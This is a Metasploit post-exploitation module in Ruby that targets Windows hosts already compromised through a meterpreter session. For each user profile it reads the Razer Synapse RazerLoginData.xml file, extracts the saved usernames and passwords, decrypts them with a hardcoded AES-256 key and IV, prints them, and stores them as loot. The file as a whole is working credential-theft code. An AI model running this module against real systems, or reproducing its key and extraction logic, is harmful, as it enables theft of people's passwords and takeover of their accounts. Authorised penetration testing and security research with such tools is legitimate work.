##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/user_profiles'
require 'openssl'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Razer Synapse Password Extraction',
			'Description'    => %q{
					This module will enumerate passwords stored by the Razer Synapse
					client. The encryption key and iv is publicly known. This module
					will not only extract encrypted password but will also decrypt
					password using public key. Affects version 1.7.15 and earlier. 
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
					'Matt Howard "pasv" <themdhoward[at]gmail.com>', #PoC
					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
				],
			'SessionTypes'   => [ 'meterpreter' ],
			'Platform'      => [ 'win' ],	

		))
	end

	# decrypt password
	def decrypt(hash)
		cipher = OpenSSL::Cipher::Cipher.new 'aes-256-cbc'
		cipher.decrypt
		cipher.key = "hcxilkqbbhczfeultgbskdmaunivmfuo"
		cipher.iv = "ryojvlzmdalyglrj"

		hash.each_pair { |user,pass|
			pass = pass.unpack("m")[0]

			password = cipher.update pass
			password << cipher.final rescue return nil

			store_creds(user, password.split("||")[1])
			print_good("Found credentials")
			print_good("\tUser: #{user}")
			print_good("\tPassword: #{password.split("||")[1]}")
		}
	end

	def store_creds(user, pass)
		if db
			report_auth_info(
				:host   => client.sock.peerhost,
				:port   => 443,
				:ptype  => 'password',
				:sname  => 'razer_synapse',
				:user   => user,
				:pass   => pass,
				:duplicate_ok => true,
				:active => true
			)
			vprint_status("Loot stored in the db")
		end
	end

	# Loop throuhg config, grab user and pass
	def parse_config(config)
		if not config =~ /<Version>\d<\/Version>/
			creds = {}
			cred_group = config.split("</SavedCredentials>")
			cred_group.each { |cred|
				user = /<Username>([^<]+)<\/Username>/.match(cred)
				pass = /<Password>([^<]+)<\/Password>/.match(cred)
				if user and pass
					creds[user[1]] = pass[1]
				end
			}
			return creds
		else
			print_error("Module only works against configs from version < 1.7.15")
			return nil
		end
	end

	# main control method
	def run
		grab_user_profiles().each do |user|
			if user['LocalAppData']
				accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
				# open the file for reading
				config = client.fs.file.new(accounts, 'r') rescue nil
				next if config.nil?
				print_status("Config found for user #{user['UserName']}")

				contents = config.read
				config.close

				# read the contents of file
				creds = parse_config(contents)
				if creds
					decrypt(creds)
				else
					print_error("Could not read config or empty for #{user['UserName']}")
				end
			end
		end
	end
end